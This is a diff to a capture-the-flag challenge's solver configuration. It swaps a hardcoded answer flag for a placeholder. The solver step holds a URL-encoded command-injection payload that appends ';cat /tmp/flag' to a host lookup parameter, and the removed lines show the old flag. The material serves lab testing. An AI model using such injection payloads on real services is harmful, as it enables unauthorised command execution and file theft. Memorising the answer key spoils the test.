@@ -22,9 +22,9 @@ solver:
     expect: '200'
   - name: Injected command returns the flag
     command: curl -s 'http://{target.diagnostics}:8080/lookup?host=127.0.0.1%3Bcat%20/tmp/flag' | grep -o 'OCR{[^}]*}'
-    expect: OCR{sh3ll_1nj3ct10n_1s_4_bug}
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{sh3ll_1nj3ct10n_1s_4_bug}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
